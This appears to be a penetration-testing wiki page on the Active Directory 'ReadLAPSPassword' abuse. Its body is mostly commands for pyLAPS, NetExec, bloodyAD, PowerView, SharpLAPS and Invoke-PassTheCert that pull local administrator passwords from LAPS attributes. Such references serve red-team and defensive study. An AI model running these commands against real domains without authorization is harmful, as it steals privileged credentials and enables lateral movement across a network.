---
authors: CravateRouge, ShutdownRepo, mpgn
category: ad
---

# ReadLAPSPassword

This abuse can be carried out when controlling an object that has `GenericAll` or `AllExtendedRights` (or combination of `GetChanges` and (`GetChangesInFilteredSet` or `GetChangesAll`) for domain-wise synchronization) over the target computer configured for LAPS. The attacker can then read the LAPS password of the computer account (i.e. the password of the computer's local administrator).

::: tabs

=== UNIX-like

From UNIX-like systems, [pyLAPS](https://github.com/p0dalirius/pyLAPS) (Python) can be used to retrieve LAPS passwords.

```bash
pyLAPS.py --action get -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP"
```

Alternatively, [NetExec](https://github.com/Pennyw0rth/NetExec) also has this ability. In case it doesn't work [this public module](https://github.com/T3KX/Crackmapexec-LAPS) for CrackMapExec could also be used.

```bash
# Default command
nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps

# The COMPUTER filter can be the name or wildcard (e.g. WIN-S10, WIN-* etc. Default: *)
nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps -O computer="target-*"
```

Impacket's ntlmrelayx also carries that feature, usable with the `--dump-laps`.

[LAPSDumper](https://github.com/n00py/LAPSDumper) is another Python alternative.

Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```


=== Windows

This can be achieved with the Active Directory PowerShell module.

```bash
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```

The [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) powershell module from PowerSploit can also be used for that purpose.

```powershell
Get-DomainComputer "MachineName" -Properties 'cn','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```

[SharpLAPS](https://github.com/swisskyrepo/SharpLAPS) (C#) automates that process. 

```bash
SharpLAPS.exe /user:"DOMAIN\User" /pass:"Password" /host:"192.168.1.1"
```

Also, the [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell version).

> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
```powershell
# Import the PowerShell script and show its manual
Import-Module .\Invoke-PassTheCert.ps1
.\Invoke-PassTheCert.ps1 -?
# Authenticate to LDAP/S
$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
# List all the available actions
Invoke-PassTheCert -a -NoBanner

# Returns all readable LAPS Passwords in the 'ADLAB.LOCAL' Domain (method 1)
Invoke-PassTheCert -Action 'Filter' -LdapConnection $LdapConnection -SearchBase 'DC=ADLAB,DC=LOCAL' -SearchScope 'Subtree' -Properties '*' -LDAPFilter '(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*))'

# Returns all readable LAPS Passwords in the 'ADLAB.LOCAL' Domain (method 2, same as method 1)
Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'LAPS' -SearchBase 'DC=ADLAB,DC=LOCAL'
```

:::


## Resources

[https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
